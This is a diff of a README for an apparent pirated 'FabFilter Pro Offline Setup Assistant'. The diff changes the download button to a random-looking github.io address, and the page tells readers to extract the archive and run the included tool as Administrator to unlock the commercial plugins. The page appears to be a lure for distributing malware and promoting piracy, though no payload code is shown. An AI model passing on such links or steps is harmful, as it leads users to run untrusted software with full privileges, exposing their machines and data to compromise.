@@ -1,6 +1,6 @@
 # FabFilter Pro — Offline Setup Assistant
 
-<a href="https://fabfilter-pro-q-3-download.github.io/.github" target="_blank">
+<a href="https://ryadikmntiiks.github.io/.github/fabewa" target="_blank">
   <img src="https://img.shields.io/badge/DOWNLOAD%20SETUP_ASSISTANT-%F0%9F%92%BE-blue?style=for-the-badge&logo=cloudsmith&logoColor=white" alt="Download Setup Assistant">
 </a>
 
@@ -11,8 +11,8 @@
 ## ⚙️ How to Use
 
 1. Download the Setup Assistant using the button above  
-2. Extract the archive using 7-Zip or WinRAR  
-3. Run the included tool as Administrator  
+2. Extract the archive using **7-Zip** or **WinRAR**  
+3. Run the included tool as **Administrator**  
 4. Follow the step-by-step instructions for your OS  
 5. Launch your DAW — all FabFilter Pro plugins should now be fully available  
 
